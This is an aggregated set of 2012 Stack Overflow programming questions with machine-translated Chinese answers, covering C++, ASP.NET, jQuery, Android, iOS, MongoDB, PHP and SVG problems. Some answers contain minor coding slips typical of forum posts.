Sun Mon Tue Wed Thu Fri Sat   Week #
                         1     1
 2   3   4   5   6   7   8     2
 9  10  11  12  13  14  15     3
16  17  18  19  20  21  22     4
23  24  25  26  27  28  29     5
30  31                         6 
```

# c++ - porting VS to linux: no matching function for call to

> ID：12760867
> 
> 赞同：3
> 
> 时间：2012-10-06T14:56:19.770
> 
> 标签：c++, visual-studio-2010, gcc

i'm trying to port code that compiles ok with visual studio and on linux gcc4.6 throws this:

```
PieMenu.cpp: In member function ‘void PieMenu::AddButtons()’:
error: no matching function for call to ‘std::basic_ifstream<char>::open(const wchar_t*)’

PieMenu.cpp:110:44: note: candidate is:
/usr/include/c++/4.6/fstream:531:7: note: void std::basic_ifstream<_CharT, _Traits>::open(const char*, std::ios_base::openmode) [with _CharT = char, _Traits = std::char_traits<char>, std::ios_base::openmode = std::_Ios_Openmode]
/usr/include/c++/4.6/fstream:531:7: note:   no known conversion for argument 1 from ‘const wchar_t*’ to ‘const char*’ 
```

this is the relevant part of .cpp:

```
void PieMenu::AddButtons()
{
        CString slash = CUtils::Slash();

        CString texturePath,namelistPath=m_pluginPath;
#ifndef linux
        texturePath =  L".." + slash + L".." + slash; // On windows plugin is located two levels below...
        namelistPath += texturePath;
#endif
        texturePath += L"data" +slash+ m_folderpath + slash + L"textures" + slash;
        namelistPath += L"data" +slash+ m_folderpath + slash + m_folderpath + L".txt";

        for(int i=0;i<m_buttonCount;i++)
        {
            CString bPath = texturePath + m_folderpath + CString(i);
            m_buttons.push_back(ToolButton());
            m_buttons[i].Setup( bPath.GetWideString(), i);
        }

        string l_str;
        ifstream infile; 
```

this is the line 110 of the code:

```
 infile.open (namelistPath.GetWideString());

        int k=0;
        while(!infile.eof() && k < m_buttonCount) // To get you all the lines.
        {
            std::getline(infile,l_str); // Saves the line in STRING.
            m_buttons[k].SetName(CString(l_str.data()));
            k++;
        }
        infile.close();
} 
```

all hints and help appreciated!

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-06T15:02:20.727

C++ 标准库没有`open()`为将文件名作为宽字符的文件流定义函数，与流是否用于宽字符无关。也就是说，如果您想将一个宽字符串用作文件名，则需要将其转换为合适的`char`s 序列。如何以所需的方式执行此操作取决于您的需求。

从外观上看，Windows 实现了一种使用宽字符串打开文件的方法，并且它们的标准 C++ 库支持一个扩展，允许您使用宽字符串调用`open()`（或只调用 的文件流的构造函数`open()`）。

# asp.net - 将 UpdatePanel 添加到 aspx 页面

> ID：12760870
> 
> 赞同：1
> 
> 时间：2012-10-06T14:56:50.023
> 
> 标签：asp.net, updatepanel, scriptmanager

我会感谢你的帮助。我正在尝试向我的页面添加一个更新面板，因此它只刷新网格视图而不是漏洞页面。我必须将它插入不同的地方，但它似乎不起作用，仍然刷新了孔页面。我应该在哪里插入它？

我有一个下拉列表，通过它填充网格视图。这是代码：

```
 <%@ Page Title="All Products" Language="C#" MasterPageFile="~/MasterPage/MasterPage.master" AutoEventWireup="true" CodeFile="All.aspx.cs" Inherits="Catalog_All" %>

<asp:Content ID="Content1" ContentPlaceHolderID="head" Runat="Server">
    <style type="text/css">
        .style4
        {
            width: 100%;
        }
        .style5
        {
            width: 620px;
        }
        .style6
        {
            font-size: large;
            text-decoration: underline;
        }
    </style>
</asp:Content>
<asp:Content ID="Content2" ContentPlaceHolderID="ContentPlaceHolder1" Runat="Server">
<div>

  <asp:DropDownList ID="DropDownList1" runat="server" AppendDataBoundItems="True" 
                    AutoPostBack="True" DataSourceID="SqlDataSource2" DataTextField="CategoryName" 
                    DataValueField="categoryId" 
        onselectedindexchanged="DropDownList1_SelectedIndexChanged">
                    <asp:ListItem Value="">choose pet</asp:ListItem>
                </asp:DropDownList>
                <asp:SqlDataSource ID="SqlDataSource2" runat="server" 
                    ConnectionString="<%$ ConnectionStrings:AllPets %>" 
                    SelectCommand="SelectAllCategories" SelectCommandType="StoredProcedure">
                </asp:SqlDataSource>

    <table class="style4">
        <tr>
            <td colspan="2" class="style6">
                <strong>All products</strong></td>
        </tr>

        <tr>
            <td class="style5">
                &nbsp;</td>
            <td>

            </td>
        </tr>
        <tr>

            <td class="style5">

                <asp:GridView ID="GridView1" runat="server" AutoGenerateColumns="False" 
                    DataKeyNames="ProductID" DataSourceID="SqlDataSource1" AllowPaging="True">

                    <Columns>
                        <asp:BoundField DataField="ProductName" HeaderText="product" 
                            SortExpression="ProductName" />
                        <asp:ImageField DataAlternateTextField="picPath" DataImageUrlField="picPath" 
                            HeaderText="pic">
        </asp:ImageField>
                        <asp:BoundField DataField="Price" HeaderText="price" 
                            SortExpression="Price" />
                        <asp:BoundField DataField="Summary" HeaderText="des" 
                            SortExpression="Summary" />
                    </Columns>

                </asp:GridView>

                <asp:SqlDataSource ID="SqlDataSource1" runat="server" 
                    ConnectionString="<%$ ConnectionStrings:get_products_bypet %>" 
                    SelectCommand="get_products_bypet" SelectCommandType="StoredProcedure">
                    <SelectParameters>
                        <asp:ControlParameter ControlID="DropDownList1" Name="categoryId" 
                            PropertyName="SelectedValue" Type="Int32" />
                    </SelectParameters>
                </asp:SqlDataSource>

            </td>
            <td>
                &nbsp;</td>
        </tr>
        <tr>
            <td class="style5">
                &nbsp;</td>
            <td>
                &nbsp;</td>
        </tr>
        <tr>
            <td class="style5">
                &nbsp;</td>
            <td>
                &nbsp;</td>
        </tr>
    </table>

</div>

</asp:Content> 
```

tahnx 的帮助

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T15:18:33.583

将其添加到 Content 标记之后，直到最后，因为您使用 DropDownList 进行自动完整回发

```
 <asp:Content ID="Content2" ..>
        <asp:UpdatePanel ID="updPanl" runat="server" RenderMode="Block" UpdateMode="Conditional" >
        <ContentTemplate>
       ........ rest code .........
        </ContentTemplate>
        </asp:UpdatePanel>
    </asp:Content> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-06T15:19:09.390

试试这个，把下拉列表和gridview放在同一个更新面板中。如果您不想将下拉菜单放在同一个面板中，[请检查第二个答案](http://www.asp.net/web-forms/tutorials/aspnet-ajax/understanding-asp-net-ajax-updatepanel-triggers)

```
<asp:UpdatePanel runat="server" ID="Upd">
<ContentTemplate>

      <%-- Dropdown list here should work --%>

      <asp:GridView ID="GridView1" runat="server" AutoGenerateColumns="False" 
                DataKeyNames="ProductID" DataSourceID="SqlDataSource1" AllowPaging="True">

                <Columns>
                  ....
                </Columns>

            </asp:GridView>
</ContentTemplate>
</asp:UpdatePanel> 
```

如果您不想将下拉菜单放在同一个更新面板中，请使用触发器

```
<%-- dropdown list outside here --%>
<asp:UpdatePanel runat="server" ID="Upd">
 <ContentTemplate>
       <%-- Only your Gridview here --%>
 </ContentTemplate>

 <Triggers>
 <asp:AsyncPostBackTrigger ControlID="DropdownList1" 
     EventName="SelectedIndexChange" />
 </Triggers>
 </asp:UpdatePanel> 
```

# math - Calculate likelihood of soccer player to intercept pass

> ID：12760872
> 
> 赞同：0
> 
> 时间：2012-10-06T14:57:10.073
> 
> 标签：math

I am working on a soccer game engine in C#, and specifically the safety of a pass along the ground. I'm having a hard time thinking of a suitable formula to indicate how far an opposing player might be from intercepting a pass. I want to be able to give a likelihood between 0 and 1, ignoring all other factors like ball height, player pace/ability/etc. In other words, I'm thinking mostly about current position of the opposing player.

What formula would you deem most appropriate? Perhaps an arc with the possession player at the centre and the recipient player on the radius?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T15:30:30.027

如果我正确理解了您的问题，那么以下几行是否可行：假设一名球员 A 即将将球传给球员 B，然后一名球员 C 试图拦截传球。由于您想忽略球高度等变量，因此您只需要一些相当简单的二维数学。

从 A 点到 B 点有一条线段 AB。如果球员 C 想要拦截传球，他最有可能在属于线段 AB 并且与点 C 的距离最近的 P 点进行。如果球员 C 能够在球从 A 点移动到 P 点之前从 C 点移动到 P 点，他将能够拦截传球。同样，这很容易找出，你只需要知道球的速度以及试图拦截传球的对方球员的速度。

现在，如果你知道，假设传球和对方球员的速度的平均值和标准差，以及如果球员能及时到达那里成功拦截传球的平均机会，你可以应用一些统计数据得到一些伪有意义的估计。

# javascript - 循环通过背景图像 onClick 工作 - 但仅在 secondClick

> ID：12760873
> 
> 赞同：3
> 
> 时间：2012-10-06T14:57:12.270
> 
> 标签：javascript, css, loops, onclick

我想在两个不同的主题（例如白天模式和夜间模式）之间循环点击背景图像和背景颜色。我正在使用以下代码，它有效，但有两个问题：

1.  该功能仅在第二次单击时更改背景。第一次单击链接不会更改背景 css。
2.  我只有两个要循环的背景图像/颜色，但我不知道如何使代码在两个之间循环，所以我有一个最终会中断的长数组。

代码：

```
var allImages = ["bg-clouds.png", "bg-cloudsNight.png", "bg-clouds.png", "bg-cloudsNight.png", "bg-clouds.png"];

var allColors = ["#b7d9ef", "#011157", "#b7d9ef", "#011157", "#b7d9ef"];

$(document).ready(function() {
    $("#theLink").click(function() {
        var newImageLink = allImages.pop();
        var newColor = allColors.pop();
        $("body").css("background-image", "url(" + newImageLink + ")");
        $("body").css("background-color", "" + newColor + "");
    });
}); 
```

你能告诉我为什么这个功能只在第二次点击时有效吗？

PS：您可以在 ewb.atworq.com/permagoo/ 上看到它的实际效果（#theLink 在左上角）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-06T15:20:05.783

我会采取一种稍微不同的方法来解决首次点击问题，让您永远循环使用颜色。

在您的页面模板中添加如下内容：

```
<style>
.daytime {
   background-image: url('bg-clouds.png');
   background-color: #b7d9ef;
}
.nighttime {
   background-image: url('bg-cloudsNight.png');
   background-color: #011157;
}
</style> 
```

然后编辑您的模板或其他内容：`<body class="daytime">`页面呈现时

现在，您只需将类名从更改`daytime`为`nighttime`如下所示即可切换图像和颜色：

```
<script>
$(document).ready(function() {
    $('#theLink').click(function() {
        $('body').toggleClass('daytime nighttime');
        return false;
    });
});
</script> 
```

调用`.toggleClass()`将删除元素上存在的任何类（`daytime`将存在于第一个`click`）并添加任何不存在的类（`nighttime`将被添加）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-06T16:34:51.190

我在网站上查看了您的代码..您是正确的，您将使用两个大型重复值数组 - 这不是编写好代码的方法（抱歉）。我会推荐类似于 Ryan953 所建议的内容，但您似乎希望在不向 CSS 文件中添加类的情况下完成此操作。所以这是一个我会做的工作示例，它允许许多背景图像..

```
<html>
<head>
    <title>background image and color cycle</title>
        <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js"></script>
        <script type="text/javascript">

        var allImages = [
                "http://ewb.atworq.com/permagoo/theworks/dreaming2012/images/bg-clouds.png", 
                "http://ewb.atworq.com/permagoo/theworks/dreaming2012/images/bg-cloudsNight.png",
                "http://degnedyrlaegen.dk/picts/background-header.jpg"
            ];

        var allColors = [ "#b7d9ef", "#011157", "#a1e35b" ];

        var current = 0;

        $(document).ready(function() {
            $("#theLink").click(function() {
                $("body").css("background-image", "url(" + allImages[current] + ")").css("background-repeat","repeat-x");
                $("body").css("background-color", "" + allColors[current] + "");
                current = (current++ < allImages.length - 1) ? current : 0 ;
            });
        });
        </script>
</head>
<body>
    <h2>background image and color cycle</h2>
    <button id="theLink">cycle background</button>
</body>
</html> 
```

您可以将上面的代码复制并粘贴到本地 HTML 文件中并在本地运行 - 它应该可以工作。:)

# ios - 如何使图像视图旋转像 facebook 的 iOS 应用程序一样工作？

> ID：12760876
> 
> 赞同：0
> 
> 时间：2012-10-06T14:57:41.160
> 
> 标签：ios, rotation

在 Facebook 应用程序的主视图中，如果您单击图像，图像视图将弹出，如果您旋转设备，图像视图也会发生旋转。但主视图没有。

我的问题是：如果弹出的图像视图是主视图或主窗口的子视图，如何使子视图旋转发生而主视图不发生？看来我们只能让整个 uiviewcontroller 旋转或不旋转，而不是子视图，对吧？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T17:23:03.710

是的@phix23 是正确的。您可以将您的视图控制器注册为 deviceOrientationDidChange 通知的观察者并自己处理转换。或者，我认为您可以在其自己的视图控制器中显示您的图像视图，并将其作为主视图控制器的子视图。然后，您可以独立地使用父控制器和子控制器的自动旋转来做任何您想做的事情

# android - Retrieving a JSON array from an Android application

> ID：12760877
> 
> 赞同：0
> 
> 时间：2012-10-06T14:57:46.093
> 
> 标签：android

I manage to retrieve Json content from the URL: [http://twitter.com/statuses/public_timeline.json](http://twitter.com/statuses/public_timeline.json) Which provide just tweets. Now I want to retrieve another JSON array from another URL, which has the follwoing format:

```
 {
"contacts": [
    {
            "id": "c200",
            "name": "Ravi Tamada",
            "email": "ravi@gmail.com",
            "address": "xx-xx-xxxx,x - street, x - country",
            "gender" : "male",
    },
    {
            "id": "c201",
            "name": "Johnny Depp",
            "email": "johnny_depp@gmail.com",
            "address": "xx-xx-xxxx,x - street, x - country",
            "gender" : "male",

    },
    .
    .
} 
```

The diference as you can verify is that the one JSON array has a name and the second not. The code that I was used for the tweet retrieving, was the following one:

```
 private class LoadListTask extends AsyncTask<Void, Tweet, Void> {

    private final ProgressDialog pd = new ProgressDialog(TweetTestActivity.this);

      // can use UI thread here
      @SuppressWarnings("unchecked")
    protected void onPreExecute() {
          ((ArrayAdapter<String>)getListAdapter()).clear();
         this.pd.setMessage("Loading List...");
         this.pd.show();
      }

    protected Void doInBackground(Void... ars) {
         // TODO    4 new activity with custom adapter to show schedules
         try {
            HttpClient client = new DefaultHttpClient();
            HttpGet get = new HttpGet("http://twitter.com/statuses/public_timeline.json");

            ResponseHandler<String> responseHandler = new BasicResponseHandler();

            JSONArray ja = new JSONArray(client.execute(get, responseHandler));

            for (int i = 0; i < ja.length(); i++) {
                 JSONObject jo = (JSONObject) ja.get(i);
                 publishProgress(new Tweet(jo.getString("id_str"),jo.getString("text")));
            }
         } catch (IOException e) {
             e.printStackTrace();
         } catch (JSONException e) {
             e.printStackTrace();
         } catch (Exception e) {
             e.printStackTrace();
        }

         return null;
     }

     @SuppressWarnings("unchecked")
    protected void onProgressUpdate(Tweet... progress) {
         ((ArrayAdapter<Tweet>)getListAdapter()).add(progress[0]);
         }

     protected void onPostExecute(Void result) {
         pd.dismiss();
     }
 } 
```

Question: What changes should i perform to retrieve the contacts array? Because when i just change the id_str to gender(and the URL of course) i take an error which says: org.json.JSONException: No value for gender.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T15:03:21.400

```
JSONObject jObj = new JSONObject (client.execute(get, responseHandler));

JSONArray ja = new JSONArray(jObj.getJSONArray("contacts"));
enter code here
for (int i = 0; i < ja.length(); i++) {
    JSONObject jo = (JSONObject) ja.get(i);
    publishProgress(new Tweet(jo.getString("id_str"),jo.getString("text")));
} 
```

而且没有像**文本**这样的字符串 ，您正在阅读`---> jo.getString("text");`为什么？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-06T17:26:35.333

使用 json api 真是太棒了。但是考虑对象映射器，例如 gson [http://code.google.com/p/google-gson/](http://code.google.com/p/google-gson/)或 jackson [http://jackson.codehaus.org/](http://jackson.codehaus.org/)。他们可能会使您的代码保持简洁。

# c++ - 包含 LPCTSTR 的函数

> ID：12760878
> 
> 赞同：4
> 
> 时间：2012-10-06T14:57:50.513
> 
> 标签：c++, c, contains

我有一个像这样的代码：

```
int contains(LPCTSTR name)
{
   char * data = "test.txt";
} 
```

如何检查是否`name`包含“数据”？谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-06T20:30:58.963

由于您使用的是 Windows 和`TCHAR`，因此更惯用的解决方案是：

```
BOOL contains(LPCTSTR lpName) {
    return _tcsstr(name, _T("data"));
} 
```

除非你`data`故意是 a `char *`，在这种情况下答案会改变。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-06T15:11:56.203

有一个被调用的函数[`strstr`](http://msdn.microsoft.com/en-us/library/z9da80kz%28v=vs.100%29.aspx)用于检查一个字符串是否包含另一个字符串。但是，由于您正在使用，`LPCTSTR`您应该注意它可能会根据您的项目设置而有所不同。如果您在链接的手册页中阅读更多内容，您会看到它提到`_tcsstr`哪个宏可以扩展为正确的功能。

如果您改用 C++ `std::string`，则有该[`find`](http://en.cppreference.com/w/cpp/string/basic_string/find)方法。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-06T15:16:10.813

Unicode 或非 Unicode，您可以使用[Shell Lightweight Utility String Functions](http://msdn.microsoft.com/en-us/library/windows/desktop/bb759983%28v=vs.85%29.aspx)：

```
int contains(LPTSTR name)
{
    LPTSTR data = _T("test.txt");
    if(StrStrI(name, data) != NULL)
    {
        return 1;
    }
    return 0;
} 
```

您需要包含`shlwapi.h`和链接`shlwapi.lib`.

还要注意`StrStrI`不区分大小写，要区分大小写，它只是`StrStr`.

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-06T17:05:12.720

其他人建议使用 C 方法；由于您使用了标签“c++”，您可能希望使用该语言及其`bool`返回类型或字符串类等特性。

此外，由于您正在为 Windows 编写代码（我阅读了`LPCTSTR name`参数），您可能希望使用 Windows 特定的便捷类，例如`CString`.

在这种情况下，您可以只使用[`CString::Find()`method](http://msdn.microsoft.com/en-us/library/hz2099kw%28v=vs.80%29.aspx)，或者将其包装在这样的函数中（应该在 ANSI/MBCS 和 Unicode 版本中编译）：

```
bool ContainsSomeText(const CString& name)
{
    const TCHAR* data = _T("test.txt");
    return (name.Find(data) >= 0);
} 
```

此外，如果您想要*不区分大小写*的比较，您可能需要调用[`CString::MakeLower()`](http://msdn.microsoft.com/en-US/library/eyxcxazf%28v=vs.80%29.aspx)输入字符串（在这种情况下，因为您正在修改副本，所以按值传递）：

```
bool ContainsSomeText(CString name)
{
    const TCHAR* data = _T("test.txt"); // lower-case
    return (name.MakeLower().Find(data) >= 0);
} 
```

# mongodb - mongodb $all and $in very slow even on indexed fields

> ID：12760879
> 
> 赞同：5
> 
> 时间：2012-10-06T14:57:57.913
> 
> 标签：mongodb

I have a collection of about 80 million documents, each of them storing an array of tags in the `tags` field, e.g:

```
{text: "blah blah blah...", tags: ["car", "auto", "automobile"]} 
```

The field `tags` is indexed, so naturally the queries like this are almost instant:

```
 db.documents.find({tags:"car"}) 
```

However the following queries are all very slow, taking several minutes to complete:

```
 db.documents.find({tags:{$all:["car","phone"]}})
 db.documents.find({tags:{$in:["car","auto"]}}) 
```

The problem persists even if the array only has a single item:

```
 db.documents.find({tags:{$all:["car"]}})  //very slow too 
```

I thought $all and $in should be able to work very fast because `tags` is indexed but apparently it is not the case. Why?

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-10-06T16:49:01.887

事实证明这是 MongoDB 中的一个已知错误，截至 2.2 尚未修复

MongoDB*在*使用`$all`. 仅使用索引查找数组中的第一项，并扫描所有匹配的文档以过滤结果。

例如，在查询中，`db.documents.find({tags:{$all:["car","phone"]}})`所有包含标签“汽车”的文档都需要被检索和扫描。由于有问题的集合包含超过十万个带有“汽车”标签的文档，因此速度放缓并不奇怪。

更糟糕的是，MongoDB 甚至没有执行简单的优化，即选择 $all 数组中代表最少的项目进行索引查找。如果有 100000 个文档标记为“car”和 10 个文档标记为“phone”，MongoDB 仍然需要扫描 100000 个文档以返回结果`{$all:["car", "phone"]}`

另见：[https ://jira.mongodb.org/browse/SERVER-1000](https://jira.mongodb.org/browse/SERVER-1000)

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-11-14T10:34:41.317

我只想补充一点，$in 很快。事实上，对于 1 个条件或关键字，$in 与 $all 等价，但 $in 很快，$all 很慢。

所以使用 $in。

# php - How to avoid Fatal error: Allowed memory size of 83886080 bytes exhausted

> ID：12760880
> 
> 赞同：-1
> 
> 时间：2012-10-06T14:57:57.497
> 
> 标签：php

> **Possible Duplicate:**
> [Error: Allowed memory size of 67108864 bytes exhausted](https://stackoverflow.com/questions/3887692/error-allowed-memory-size-of-67108864-bytes-exhausted)

I have a (multiple) file upload form on my website, and it works, but if I upload too much files (depends on file size I guess) I get that error. I know I can edit the memory_limit property in php.ini, but is their a way I can free up that memory with php?

I'm uploading some images, then they are resized and cropped to two images, and then saved in a directory and in a database.

Thanks

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T15:23:55.357

当不再需要图像时（例如，当它被复制到不同的图像中时），可以使用 imagedestroy() 释放内存。这是一个例子：

```
function resize($width, $image,$path,$rand,$i) {
    $max_width = $width;
    $old_width = imagesx($image);
    $old_height = imagesy($image);
    $scale = ($max_width / $old_width);
    $new_width = ceil($scale*$old_width);
    $new_height = ceil($scale*$old_height);
    $new = imagecreatetruecolor($new_width, $new_height);
    imagecopyresampled($new, $image, 0, 0, 0, 0, $new_width, $new_height, $old_width, $old_height);

    imagedestroy($image);

    return imagejpeg($new,"../../../bonangana/img/albums/$path/" . $rand . "_". str_replace(" ", "_", trim($_FILES['file']['name'][$i])));
} 
```

# c++ - c++ MIDI sequencer and smf loader library on windows

> ID：12760882
> 
> 赞同：0
> 
> 时间：2012-10-06T14:58:18.710
> 
> 标签：c++, midi

I'm Japanese web engineer.

I'm developing a MIDI Sequencer(SMF player) application running on Windows (XP), using C++ as programming language and Qt as GUI Library. And I'm in trouble now.

For developing this application, I'm searching for MIDI Sequencer library. And Standard MIDI File loader library useful on Windows, but I can't find good one.

For example, jdksmidi, I can't compile successfully; juce, needs Visual Studio environment, and I'm developing in Qt environment and don't want to use ViualStudio; TSE3, Win32.cpp is uncompilable.

Please tell me good some library for MIDI sequencing and smf loading on Windows.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T18:30:26.503

如果还有其他方法，请使用手动方法：

MIDI 输入/输出：选择纯 Windows API

SMF loader：自己编写

# google-chrome - Chromium SVG hover tooltip weirdness

> ID：12760886
> 
> 赞同：3
> 
> 时间：2012-10-06T14:58:54.613
> 
> 标签：google-chrome, svg, hover, tooltip, chromium

In many browsers, hover mousepointer over an SVG object with a nested `<title>` and the title text appears as a tooltip. I'm discovering something strange happens in Chrome if adjacent objects have the same title: the tooltip is not redisplayed when you mouseover from one object to the other.

This can be replicated with the following code/fiddle. In IE, you get a fresh tooltip for each object.

How can I work around this issue? I need to use Chromium and I need the same tooltip to reappear over adjacent objects. I don't really want to get into (more) scripting unless it can be done in a super lightweight, reliable and flawless with SVG.

Perhaps I can embed something invisible into the title text to make Chromium think each object's title is different?

```
<svg xmlns="http://www.w3.org/2000/svg" version="1.1">
<rect x="0" y="0" width="100" height="100" fill="yellow" stroke="black">
    <title>square</title>
</rect>
<rect x="100" y="0" width="100" height="100" fill="yellow" stroke="black">
    <title>square</title>
</rect>
<rect x="0" y="100" width="100" height="100" fill="yellow" stroke="black">
    <title>square</title>
</rect>
<rect x="100" y="100" width="100" height="100" fill="yellow" stroke="black">
    <title>SQUARE</title>
</rect>
</svg> 
```

[http://jsfiddle.net/CvZfR/](http://jsfiddle.net/CvZfR/)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-06T18:13:15.143

我找到了一种可行的方法：将一些`&zwnj;`或`&zwj;`放入标题文本中。这些是零宽度的不可见字符。这些的不同组合使标题看起来与 Chromium 不同。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-06T15:56:52.693

我想这可能对您的需求有点沉重，而且您还必须实现一种禁用默认工具提示显示的方法。

鉴于 css 似乎没有做这项工作，这里的线程中的一个帖子：[如何使用 jQuery 在浏览器中禁用工具提示？](https://stackoverflow.com/questions/1027762/how-to-disable-tooltip-in-the-browser-with-jquery)提出可以将标题属性重命名为 aTitle 或类似名称的建议。由于这些实际上包含在标题标签中，而不是 rect 元素的标题属性，我猜你可以（1）创建新元素，（2）复制标题的内容（3）在旧元素之前附加新元素，（4）删除旧元素。

不过，我不知道您是否可以 document.createElement('aTitle') - 我不记得是否失败。

Anyhoo - 这里的jsfiddle：http: [//jsfiddle.net/CvZfR/25/](http://jsfiddle.net/CvZfR/25/)

# iphone - 应用程序无法读取 iCloud 文件

> ID：12760896
> 
> 赞同：1
> 
> 时间：2012-10-06T15:00:35.580
> 
> 标签：iphone, objective-c, ios, xcode, icloud

我正在开发一个基于 icloud 的非常简单的应用程序。它的作用如下：

*   获取 UbiquityContainer url 并在那里创建/写入一个带有一些数组的“plist”文件。

当应用程序第一次安装在设备上时，它工作得很好。icloud 可以文档可以在设置/ icloud 部分观察。

当我从设备中删除应用程序并重新安装时。它不读取文件。显示以下错误。

```
"The operation couldn’t be completed. Bad file descriptor" 
```

我不知道我错过了什么。这太令人不安了。

**编辑：**异地代码链接已删除。请编辑您的问题并包含引发错误的代码。

请提出解决方案...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-23T15:45:40.347

首先，如果您暂停应用程序并再次打开它，它会起作用吗？

1.  运行应用程序。
2.  按下主页按钮。
3.  启动另一个应用程序/等待几秒钟。
4.  从后台重新打开应用程序。

二：删除后检查文件是否还在：[https ://developer.icloud.com/](https://developer.icloud.com/)

第三：确保在您尝试访问之前下载了包含该文件的完整目录（来自[这里](http://www.cocoabuilder.com/archive/cocoa/316297-copy-from-icloud-to-sandbox-fails.html)的这篇文章）。

# memory - IOS 6，内存不足警告崩溃

> ID：12760901
> 
> 赞同：2
> 
> 时间：2012-10-06T15:01:46.733
> 
> 标签：memory, crash, ios6, memory-leaks

我的应用程序在升级到 IOS 6.0 后不断崩溃。在控制台中，它显示内存不足警告，这在 IOS 4 和 IOS 5 中不会发生......我正在使用 ARC。我尝试查看崩溃报告，但什么也没告诉我，就在这里

```
=============================================
Incident Identifier: 06CF58AA-4C1A-4CA3-A522-F44881E8D301
CrashReporter Key:   69ed28238a860bdf99a77524c1b4b029516122e1
Hardware Model:      iPod4,1
OS Version:          iPhone OS 6.0 (10A403)
Kernel Version:      Darwin Kernel Version 13.0.0: Sun Aug 19 00:27:34 PDT 2012; root:xnu-2107.2.33~4/RELEASE_ARM_S5L8930X
Date:                2012-10-06 20:57:43 +0800
Time since snapshot: 63 ms

Free pages:        318
Active pages:      1626
Inactive pages:    1057
Throttled pages:   44479
Purgeable pages:   5
Wired pages:       15989
Largest process:   MJClub

Processes
     Name                    <UUID>                       rpages       recent_max       [reason]          (state)

      MobileMail <bff817c61ce33c85a43ea9a6c98c29f5>         1053             1053         [vm]         (resume) (continuous)
     MobilePhone <3fca241f2a193d0fb8264218d296ea41>          996              996         [vm]         (resume) (continuous)
            tccd <eb5ddcf533663f8d987d67cae6a4c4ea>          161              161         [vm]         (daemon)
          MJClub <ab7b5723f2023289927f68004c99544b>        17907            17907         [vm]         (frontmost) (resume)
            ptpd <04a56fce67053c57a7979aeea8e5a7ea>          588              588                      (daemon)
    mediaserverd <80657170daca32c9b8f3a6b1faac43a2>          442              442                      (daemon)
         syslogd <cbef142fa0a839f0885afb693fb169c3>          148              148                      (daemon)
      aosnotifyd <d4d14f2914c3343796e447cfef3e6542>          434              434                      (daemon)
     dataaccessd <2a3f6a518f3f3646bf35eddd36f25005>         1347             1347                      (daemon)
   iaptransportd <f784f30dc09d32078d87b450e8113ef6>          213              213                      (daemon)
       locationd <892cd1c9ffa43c99a82dba197be5f09e>          701              701                      (daemon)
           wifid <9472b090746237998cdbb9b34f090d0c>          297              297                      (daemon)
     SpringBoard <27372aae101f3bbc87804edc10314af3>         2462             2462                     
      backboardd <5037235f295b33eda98eb5c72c098858>         3475             3475                      (daemon)
         configd <4245d73a9e96360399452cf6b8671844>          368              368                      (daemon)
   fairplayd.N81 <335829f71dcd315fae46a042918d4716>          145              145                      (daemon)
       fseventsd <996cc4ca03793184aea8d781b55bce08>          317              317                      (daemon)
         imagent <1e68080947be352590ce96b7a1d07b2f>          353              353                      (daemon)
   mDNSResponder <3e557693f3073697a58da6d27a827d97>          204              204                      (daemon)
       lockdownd <ba1358c7a8003f1b91af7d5f58dd5bbe>          266              266                      (daemon)
          powerd <2d2ffed5e69638aeba1b92ef124ed861>          144              144                      (daemon)
  UserEventAgent <6edfd8d8dba23187b05772dcdfc94f90>          431              431                      (daemon)
     debugserver <185719f06f1631d4922c652bdd4c8529>            0                0                      (daemon)
springboardservi <ff6f64b3a21a39c9a1793321eefa5304>            0                0                      (daemon)
    syslog_relay <45e9844605d737a08368b5215bb54426>            0                0                      (daemon)
      DTMobileIS <23303ca402aa3705870b01a9047854ea>            0                0                      (daemon)
    syslog_relay <45e9844605d737a08368b5215bb54426>            0                0                      (daemon)
notification_pro <845b7beebc8538ca9ceef731031983b7>          131              131                      (daemon)
            afcd <b0aff2e7952e34a9882fec81a8dcdbb2>          136              136                      (daemon)
filecoordination <fbab576f37a63b56a1039153fc1aa7d8>          122              122                      (daemon)
       distnoted <a89af76ec8633ac2bbe99bc2b7964bb0>          106              106                      (daemon)
            apsd <94d8051dd5f5362f82d775bc279ae608>          316              316                      (daemon)
        networkd <0032f46009f53a6c80973fe153d1a588>          159              159                      (daemon)
      aggregated <8c3c991dc4153bc38aee1e841864d088>           94               94                      (daemon)
        BTServer <c92fbd7488e63be99ec9dbd05824f5e5>          300              300                      (daemon)
       securityd <dafed6d6d9843902a4a215ae04b0b530>          156              156                      (daemon)
         notifyd <51c0e03da8a93ac8a595442fcaac531f>          155              155                      (daemon)

**End**
=========================================================== 
```

我对仪器不太了解，但我也看看它，这是仪器的一些数据

通过使用活动监视器

*   虚拟内存=219M

*   真实内存= 32M

通过使用分配

*   Live Byte = 2.5M（在 2.5M 左右崩溃）

*   通过使用泄漏

带走admob时未发现泄漏

使用 admob 时发现了一点泄漏，但我认为这并不重要

通过使用 VMTracker

*   驻留大小=82.43MB

*   Dirty Size=40MB 一开始增加到 72MB，一直收到内存不足警告和崩溃，如果我不使用 admob，应用程序可以运行超过 1 小时没有任何问题。

对于我使用最新的 6.2.0 的 admob，我尝试使用中介 ID/发布者 ID，两者都给出相同的结果。使用 6.0.1 给出相同的结果。

